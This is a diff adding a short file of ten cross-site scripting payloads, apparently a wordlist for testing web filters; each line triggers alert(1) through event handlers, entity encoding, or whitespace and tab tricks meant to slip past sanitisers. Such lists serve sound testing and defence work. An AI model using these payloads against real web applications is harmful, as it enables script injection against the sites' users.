@@ -1,0 +1,10 @@
+<svg/onload=alert(1)>
+<img/src=x onerror=alert(1)>
+<svg%0Aonload=alert(1)>
+<img src=x onerror=alert(1)//
+<script>/**/alert(1)</script>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video><source onerror="alert(1)">
+<a href="jav&#x09;ascript:alert(1)">Click</a>
